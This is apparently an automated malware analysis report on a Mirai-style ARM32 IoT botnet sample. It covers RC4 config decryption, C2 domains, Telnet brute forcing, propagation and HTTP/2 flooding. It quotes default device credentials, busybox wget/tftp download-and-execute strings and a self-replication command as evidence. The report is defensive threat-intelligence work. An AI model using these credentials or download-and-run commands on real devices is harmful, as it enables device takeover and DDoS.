## Behaviour analysis

**10** behaviours were recovered, each with supporting evidence, and all of them are static.

### 1. Decrypts the embedded configuration

`T1140` · confidence **high** · static

Uses a 256-byte key to RC4-decrypt four embedded ciphertext blobs, recovering two C2 domains and two attack payload strings.

> **Evidence**: FUN_00016eec @0x16eec; key @0x25549; ciphertext @0x25500/0x2550c/0x25518/0x25534; decrypted results lkol.dyn, bigr.dyn, The Peoples Bank, TSource Engine Query
> 
> **Source**: `ref:3eaf2ec86f` · `ref:39dfdbc56b`

### 2. Resolves and connects to the C2 domain

`T1568` · confidence **high** · static

Reads entry 0 of the decrypted configuration table, calls the resolver interface to obtain an A record and then establishes a TCP connection; on failure it writes resolve failed to the log file.

> **Evidence**: FUN_00010d4c @0x10d4c resolves configuration table[0]; FUN_00010e68 @0x10e68 builds sockaddr and connects; dynamic event: connect(53, 152.53.15[.]127/194.36.144[.]87) ENETUNREACH, writes /tmp/pp.trace "resolve failed"
> 
> **Source**: `ref:57dc5969a2` · `ref:ca19d3dcc2` · `ref:ff389bd0aa`

### 3. Random ports to evade blocking

`T1571` · confidence **high** · static

Before connecting to the C2 it randomly selects a destination port from a 121-entry 16-bit port table and applies a byte-order conversion, avoiding blocking on a fixed port.

> **Evidence**: port table @0x245fc (121×u16, 38242-46812); random index and bswap inside FUN_00010e68 (around 0x10f54)
> 
> **Source**: `ref:c850bdb2f0` · `ref:ca19d3dcc2`

### 4. Brute-forces Telnet weak credentials

`T1110.001` · confidence **high** · static

Embeds a Mirai-style device credential and banner matching table (root/vizxv/xc3511/hi3518/telecomadmin, etc.) and tries each entry against the telnet login prompt.

> **Evidence**: credential table starts at 0x1c908; "login" @0x1c740; "/bin/busybox echo -ne " @0x1c8e0; banner token before wrgn* @0x1d0b8
> 
> **Source**: `ref:e72dc88464` · `ref:517f61b406`

### 5. Downloads and executes payloads

`T1105` · confidence **high** · static

Uses busybox wget/tftp/ftpget or curl to pull /wget.sh, /tftp.sh, /ftpget.sh, /curl.sh and /dlr.<arch> from the remote host and hands them straight to a shell for execution.

> **Evidence**: 0x1cf60 "/bin/busybox wget hxxp://"; 0x1cfa4 tftp; 0x1cfd0 ftpget; 0x1d004 curl; 0x1d018 chmod +x .d; ./.d; ./dvrHelper selfrep
> 
> **Source**: `ref:e72dc88464` · `ref:517f61b406`

### 6. Self-replication disguised as dvrHelper

`T1036.005` · confidence **high** · static

Copies itself into directories such as /var, /dev/shm, /etc, /mnt, /usr, /boot and /home and runs with the selfrep argument under the name dvrHelper to re-infect, while also changing the hostname to PBOC.

> **Evidence**: directory table @0x1d05c; 0x1cf08 "/bin/busybox hostname PBOC"; 0x1d018 "./dvrHelper selfrep"
> 
> **Source**: `ref:517f61b406` · `ref:e72dc88464`

### 7. Removes competing processes

`T1562.001` · confidence **high** · static

Walks /proc, reads each process's exe link and, on a name match for wget/tftp/curl/ftpget/netcat/socat and the like, issues kill -9; it also runs an embedded shell script to clean up other bots.

> **Evidence**: FUN_00011904 @0x11904 (readdir /proc, readlink /proc/PID/exe, kill(-pid,9)); name strings 0x1c748-0x1c774; script @0x1d0b8
> 
> **Source**: `ref:e7df67feae`

### 8. Enumerates processes and checks ELF identity

`T1057` · confidence **medium** · static

Walks /proc for process IDs, compares the inodes of /proc/PID and /proc/PID/exe, reads and validates the target ELF header and then terminates matching processes.

> **Evidence**: FUN_0001139c @0x1139c; snprintf "/proc/%d%s" @0x1c6fc and "(deleted)" @0x1c708; ELF magic comparison
> 
> **Source**: `ref:19a45935ea`

### 9. Launches HTTP/2 floods

`T1498` · confidence **high** · static

Opens up to 2000 sockets per target list in bulk with a default destination port of 443, sending the HTTP/2 connection preface and SETTINGS/HEADERS frames to flood traffic.

> **Evidence**: FUN_0000b564 @0xb564; preface "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" @0x1c4f0, literal referenced @0x3bf4; default port 0x1bb=443
> 
> **Source**: `ref:e61d776585` · `ref:9cd25674ea`

### 10. Parses remote attack commands

`T1498` · confidence **high** · static

Parses the target IP, port and attack-vector list from the C2 session and dispatches each vector to the corresponding flood module.

> **Evidence**: FUN_000082cc @0x82cc (reads u32 target address, 5-byte vector entries, optional target string list, calls FUN_000081d0 to dispatch the attack)
> 
> **Source**: `ref:49b4fc26a9`

## Don't misread this

:::important
The following conclusions are **easy to get wrong**; keep them in mind when citing this report.

- This is not ransomware: no file encryption, key negotiation or ransom notes were found; its destructive surface is network flooding and device control.
- It is not a mere downloader/installer bundle: the sample itself implements Telnet brute forcing, process removal, DDoS and persistence, and the download scripts are only the propagation step.
- Do not treat 152.53.15[.]127 and 194.36.144[.]87 as C2: they are the DNS resolver addresses of the execution environment, and the connections were refused by the network isolation.
- Do not assert that a TLS/AES-encrypted C2 channel exists: the embedded ClientHello template is more likely an attack payload than an enabled C2 encryption layer.
- Do not handle this as Windows malware: the targets are ARM32 Linux/IoT devices, with no PE structure and no registry/service behaviour.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | emulation |
| Unpacked | no |

**Limitations and open questions**

1. The network was isolated, so only resolution attempts (ENETUNREACH) were observed for the C2 domains; no real check-in, instruction delivery or port-selection result was observed.
2. The C2 destination port is chosen randomly from a 121-entry port table, so no single port can be given; the table values range from 38242 to 46812.
3. The exact division of labour between bigr.dyn and lkol.dyn (primary/backup, different channels) could not be fully distinguished from the call chain and is marked as pending dynamic verification.
4. After decryption only the first 16 bytes of the two longer configuration ciphertexts are readable (The Peoples Bank / TSource Engine Query); the remaining bytes are suspected to be extra fields or padding and were not parsed further.
5. No second-stage script/ELF artefact was captured (the host and path in the download address are assembled at runtime), so stage2 is empty.
6. No AES/SHA implementation constants were found, and the actual purpose of the embedded ClientHello (TLS flooding or HTTPS download) was not verified dynamically.
